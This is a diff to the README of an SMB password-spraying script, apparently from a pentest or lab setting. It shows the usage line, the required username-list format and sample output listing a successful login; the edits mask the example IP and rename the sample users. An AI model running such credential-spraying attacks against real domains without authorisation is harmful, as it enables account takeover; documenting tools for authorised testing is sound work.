@@ -26,7 +26,7 @@ python3 smb_spray.py <target_ip> <userlist_file> <password> [domain]
 
 **Example:**
 ```bash
-python3 smb_spray.py 172.16.231.138 users_clean.txt 'MyPassword2022' FRIENDS.local
+python3 smb_spray.py 172.16.xxx.xxx users_clean.txt 'MyPassword2022' FRIENDS.local
 ```
 
 ### Arguments
@@ -43,10 +43,10 @@ The userlist file must contain **bare usernames only** — no `@domain` suffix
 and no blank/header lines:
 
 ```
-cbing
+rahul
 pbuffay
-mgeller
-jtribbiani
+keller
+jpowtyi
 ```
 
 Do **not** use `user@domain.local` format if you're also passing a `domain`
@@ -56,14 +56,14 @@ a correct password.
 ## Output
 
 ```
-[*] Target: 172.16.231.138  Domain: FRIENDS.local  Password: MyPassword2022
+[*] Target: 172.16.xxx.xxx  Domain: FRIENDS.local  Password: MyPassword2022
 [*] Loaded 8 users from users_clean.txt
 
-[+] SUCCESS: jtribbiani  (MyPassword2022)
-[-] fail:    cbing       (STATUS_LOGON_FAILURE)
+[+] SUCCESS: jpowtyi  (MyPassword2022)
+[-] fail:    rahul       (STATUS_LOGON_FAILURE)
 ...
 
-[*] Done. 1 valid login(s): ['jtribbiani']
+[*] Done. 1 valid login(s): ['jpowtyi']
 ```
 
 - `[+] SUCCESS` — valid credential pair found
